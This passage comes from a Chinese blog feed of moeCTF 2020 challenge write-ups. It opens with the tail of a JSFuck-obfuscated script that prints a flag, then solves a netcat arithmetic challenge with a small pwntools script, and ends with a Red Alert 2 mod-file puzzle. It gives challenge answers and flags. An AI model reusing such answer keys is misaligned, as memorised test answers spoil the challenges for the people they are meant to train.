)[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[+!+[]])+[])+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure><p>虽然看起来怪怪的，但是这也是一个正常的js脚本</p><p>运用js的特性、只通过<code>[]()+!</code>六个字符进行编写的js脚本语言称之为<strong>JSFUCK</strong></p><p>直接当成常规的js脚本运行即可得到flag</p><p><img src="https://i.loli.net/2020/10/08/U9AtnyfguvRT8Mc.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;J5Fxck_1s_1nt3res7in9!&#125;</span><br></pre></td></tr></table></figure><h2 id="⑨的完美算术教室"><a href="#⑨的完美算术教室" class="headerlink" title="⑨的完美算术教室"></a>⑨的完美算术教室</h2><blockquote><p>注：本题借鉴了moectf2018的某道misc题</p></blockquote><p>nc，连上后发现题目会给我们各种不同的代数算式让我们解答</p><p><img src="https://i.loli.net/2020/10/08/zvZ8fL4ajuQrgBR.png" alt="image.png"></p><p>我们可以发现无论算式是啥，只有当我们输入字符<code>9</code>的时候程序才能继续运行下去，故尝试一直输入<code>9</code></p><p>输入99次后我们便得到了flag</p><p><img src="https://i.loli.net/2020/10/08/s3OynaXBTk1hHEG.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;c1rn0_1s_tH3_5tr0n9est!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：我们也可以使用python脚本自动输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10001</span>)</span><br><span class="line">result = p.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">b'9'</span>)</span><br><span class="line">        result = p.recv()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/08/JtsWgfSHCvx2TkF.png" alt="image.png"></p></blockquote><h2 id="闪-电-风-暴"><a href="#闪-电-风-暴" class="headerlink" title="闪 电 风 暴"></a>闪 电 风 暴</h2><blockquote><p> 一道比较简单的游戏安利题（确信</p></blockquote><p>题目名称为【闪电风暴】，闪电风暴是红色警戒中【盟军】阵营的超级武器，但是我们可以发现在这个mod包中的盟军并没有【天气控制仪】，也就无法释放超级武器【闪电风暴】</p><p><img src="https://i.loli.net/2020/10/08/XfNGZtB9IwheKMW.png" alt="image.png"></p><p>那么我们不难猜到只要把【天气控制仪】修改出来便可以得到flag</p><p>百度可以知道红警的规则文件为<code>rulesmd.ini</code>，但是很明显我们在文件夹下并不能发现这个文件</p><p><img src="https://i.loli.net/2020/10/08/vLb9BGnxU6gXYFj.png" alt="image.png"></p><p><strong>免费的hint</strong> 提示<code>XCC MIXER</code>，百度可以知道这个软件是用来从后缀名为<code>*.mix</code>的文件中提取游戏资源文件的</p><p><img src="https://i.loli.net/2020/10/08/A6EFvSJ4iQpjaMs.png" alt="image.png"></p><p>我们不难看到包内有很多的<code>*.mix</code>文件，猜测<code>rulesmd.ini</code>可能存在于其中一个当中</p><p><img src="https://i.loli.net/2020/10/08/vVABX38Ki6uLrme.png" alt="image.png"></p><p>但是这个时候我们会发现相当一部分的mix文件都无法使用<code>XCC MIXER</code>打开，考虑到题目文本中有写道：</p><p><img src="https://i.loli.net/2020/10/08/5N9jnd8zmtfwOuE.png" alt="image.png"></p><p>故可以得知存放<code>rulesmd.ini</code>的mix文件应该是被加密了，同时由于我们不知道加密方式如何，故先考虑从其他可以打开的mix文件中寻找有用的信息</p><p>在<code>expandmd94.mix</code>文件中我们可以发现这样一个名字可疑的文件：<code>winhex.shp</code>，使用xcc mixer提取出来</p><p><img src="https://i.loli.net/2020/10/08/eiczTy3HB5pDmNZ.png" alt="image.png"></p><p>还是百度，我们可以知道这种文件需要使用<code>shp builder</code>打开</p><p><img src="https://i.loli.net/2020/10/08/g7BfXK5VFrsjPJ8.png" alt="image.png"></p><blockquote><h3 id="hint-1"><a href="#hint-1" class="headerlink" title="hint-1"></a>hint-1</h3><p>hint1提示：</p><p><img src="https://i.loli.net/2020/10/08/LCmrMvXi4176Ka8.png" alt="image.png"></p><p>我们可以看到网盘的名字为<code>arttnba3的永硕网盘</code>，但是链接却是<a href="http://kiriko.ys168.com" target="_blank" rel="noopener">http://kiriko.ys168.com</a></p><p><img src="https://i.loli.net/2020/10/08/uso4xVS6PBq3eKF.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">故我们考虑将链接改为[http:&#x2F;&#x2F;arttnba3.ys168.com](http:&#x2F;&#x2F;arttnba3.ys168.com)</span><br><span class="line"></span><br><span class="line">进入该网盘即可得到一套红警修改常用工具，其中就包括&#96;&#96;&#96;SHP BUILDER </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/08/WlUKzNnR56c29mA.png" alt="image.png"></p></blockquote><p>软件<code>shp builder</code>告诉我们这个shp文件一共有114帧，我们可以发现其中大部分都是纯色帧，考虑神必数字<code>114514</code>，我们可以在第51帧发现不一样的东西，但是颜色很明显不对劲</p><p><img src="https://i.loli.net/2020/10/08/naN1Du27iyLxdrU.png" alt="image.png"></p><p>老百度人可以知道一个叫做<code>调色板</code>的东西</p><p><img src="https://i.loli.net/2020/10/08/l13R46VYfx9eb5a.png" alt="image.png"></p><p>使用翻译软件我们可以知道<code>调色板</code>的英文是<code>palette</code>，对应的在<code>shp builder</code>上方我们也可以看到一个<code>palette</code>按钮</p><p><img src="https://i.loli.net/2020/10/08/KwufTlbtM7A3r4U.png" alt="image.png"></p><p>点击选择<code>Red Alert 2</code>一栏的第一个<code>anim.pal</code>，我们发现图片变得正常了起来</p><p><img src="https://i.loli.net/2020/10/08/rp3luSN52OCIAos.png" alt="image.png"></p><p>使用<code>winhex</code>打开被加密的几个mix文件，我们可以发现<code>expandmd98.mix</code>文件的末尾offset刚好也在<code>00530F20</code>附近，不同的是比<code>winhex.shp</code>中多了一段</p><p>我们尝试将这一段多出来的数据删掉后发现该文件便可以使用xcc mixer打开了，同时我们可以发现<code>rulesmd.ini</code>文件就在里面</p><p><img src="https://i.loli.net/2020/10/08/bX3z5lheLdYI79a.png" alt="image.png"></p><blockquote><h3 id="hint-2"><a href="#hint-2" class="headerlink" title="hint - 2"></a>hint - 2</h3><p>hint2提示了我们选择相应的调色盘以及对比mix文件尾数据找出正确的mix文件</p><p><img src="https://i.loli.net/2020/10/08/RYecQ3KJW7rbkjZ.png" alt="image.png"></p></blockquote><p>使用xcc mixer提取出来，我们只需要改出【天气控制仪】或许就能得到flag</p><p>不会修改也没关系，闪电风暴直译是【lightningstrom】，搜索即可找到天气控制仪【weather control device】的代码</p><p><img src="https://i.loli.net/2020/10/08/2sbVG16BrkJEOM8.png" alt="image.png"></p><p>其中的参数都是比较简单易读的：</p><ul><li>Cost：很明显是价格，改一个低一点的即可</li><li>RequiredHouses：后面跟着一个<code>China</code>提示我们这应当指的是需求的国家，也就是只有这个国家能够进行建造的意思，改为任一盟军阵营国家名即可，可以参照上方的<code>Owner</code>语句得到国家名；当然，如果是比较熟悉红警的小伙伴应该知道这个语句是可以直接删除的</li><li>BuildLimit：建造限制，推测是数量限制，-1自然无法建造，随便改一个正数即可</li><li>TechLevel：科技等级，我们在遭遇战页面是可以看到有个调节科技等级1至10的选项的，这里等级为-1自然无法建造，改为1至10中任一整数即可</li></ul><p>我们可以发现游戏中提示我们<strong>FLAG内容在超武里</strong></p><p><img src="https://i.loli.net/2020/10/08/Ud17cPvarkSs2my.png" alt="image.png"></p><p>但是如果我们仅改掉这些限制条件，我们会发现出来的并不是正确的flag（th1s_1s_f4ke_fla9!👉this is fake flag）</p><p><img src="https://i.loli.net/2020/10/08/8rR1fjKBd2xhqQL.png" alt="image.png"></p><p>考虑到题目中有写道<strong>【添加了一个真·闪电风暴】</strong>，故我们可以知道flag应该不是藏在原超级武器中</p><p><img src="https://i.loli.net/2020/10/08/DTwjCNSy5Fq6ga2.png" alt="image.png"></p><p>我们重新回到<code>rulesmd.ini</code>，可以发现如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SuperWeapon&#x3D;LightningStormSpecial</span><br></pre></td></tr></table></figure><p>看名字应该是超级武器的意思，ini中搜索<code>LightningStormSpecial</code>我们可以发现一个类似注册名单的东西，其中最新的一个为<code>UltimateSpecial</code></p><p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1602093565355.png" alt="1602093565355"></p><p>将天气控制仪代码中语句<code>SuperWeapon=</code>后面的<code>LightningStormSpecial</code>替换为<code>UltimateSpecial</code>，重新尝试运行游戏，建造天气控制仪，得到flag</p><p>![B_T74BXSD`2@<em>Y</em>LMEZ_BAD.png](<a href="https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;enj0y_th3_p0w3r_0f_lig6tn1n9_st0rm!&#125;</span><br></pre></td></tr></table></figure><blockquote><h3 id="hint-3"><a href="#hint-3" class="headerlink" title="hint - 3"></a>hint - 3</h3><p>hint3告诉我们ini修改时需要注意限制条件，并提示我们真·闪电风暴应当在新增注册名表里有</p><p><img src="https://i.loli.net/2020/10/08/KR2VgHfd5cezaAF.png" alt="image.png"></p></blockquote><blockquote><h3 id="hint-4"><a href="#hint-4" class="headerlink" title="hint - 4"></a>hint - 4</h3><p>hint4告诉我们在csf中碰运气</p><p><img src="https://i.loli.net/2020/10/08/S3j5dG2kierolQI.png" alt="image.png"></p><p>在先前我们解密的mix文件中确实存在一个后缀名为<code>*.csf</code>的文件</p><p><img src="https://i.loli.net/2020/10/08/FG39pIlXquEgjDS.png" alt="image.png"></p><p>hint1给出的工具包包含一个CSFEditor，从名字上就可以知道是用来编辑csf文件的</p><p>打开后我们可以在<code>NAME</code>字段发现flag</p><p><img src="https://i.loli.net/2020/10/08/bj8o5W4wCuvze1Q.png" alt="image.png"></p></blockquote><blockquote><h3 id="EXTRA-快捷解法"><a href="#EXTRA-快捷解法" class="headerlink" title="EXTRA:快捷解法"></a>EXTRA:快捷解法</h3><p>我们在使用winhex查看<code>expandmd98.mix</code>时可以发现可以字符串<code>Name:UltimateStorm</code>，猜测为【真·闪电风暴】的UIName</p><p><img src="https://i.loli.net/2020/10/08/yfndjKzWN6hrUCZ.png" alt="image.png"></p><p>下载一个原版rulesmd.ini，随便更改一个单位的<code>UIName</code>字段为<code>Name:UltimateStorm</code>，再造出来也可以得到flag</p><p>这里我们选择盟军基地车</p><p><img src="https://i.loli.net/2020/10/08/2cbvVt1i3ZRF5DW.png" alt="image.png"></p><p>一进入游戏便可以得到flag</p><p><img src="https://i.loli.net/2020/10/08/oXghLYjH6aG1n49.png" alt="image.png"></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;很荣幸能和RX大哥以及诸位带师傅共同出了moeCTF2020的题目，也希望做题的各位能够获得快乐XD&lt;/p&gt;
&lt;p&gt;闲话不多说，点开即可查看题解👇&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：原题皆可在本页面直接下载&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="Alphanumeric Shellcode" scheme="http://archive.next.arttnba3.cn/tags/Alphanumeric-Shellcode/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="ret2shellcode" scheme="http://archive.next.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
